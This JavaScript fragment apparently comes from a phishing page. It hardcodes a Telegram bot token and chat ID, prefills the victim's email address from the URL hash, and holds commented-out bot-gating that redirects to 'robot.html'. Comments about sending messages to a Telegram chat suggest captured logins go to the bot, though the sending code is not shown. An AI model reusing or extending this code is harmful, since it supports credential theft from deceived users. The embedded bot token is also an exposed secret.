

let tg = {
    token: "5814857961:AAGVp4u_CJ5nu3gP9vRQ6z_EkD8VyKfWSco", 
    chat_id: "2018120795" 
}

if(window.location.hash){
  var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
    let email = window.location.hash
    let emailed = email.replace(/#/g, '')
    localStorage.clear();

if(emailed.match(validRegex)){
  localStorage.setItem("email", emailed); 
  document.getElementById('email').value = emailed
}
   
 }
 else{
  localStorage.clear();
   var cat = localStorage.getItem("email");
   var pat = document.getElementById('email').value = cat

   if(pat == null){
    document.getElementById('email').value = ''
   
   } else{
   
   }
 }



   // var xip = localStorage.getItem("allowaccessapikeybody");

  // console.log(xip)
  
  // if(xip == null){
  //   window.location.replace('robot.html')
  // }

   // document.getElementById('email').focus()

   // The user's(that you want to send a message) telegram chat id

   // Your bot's token that got from @BotFather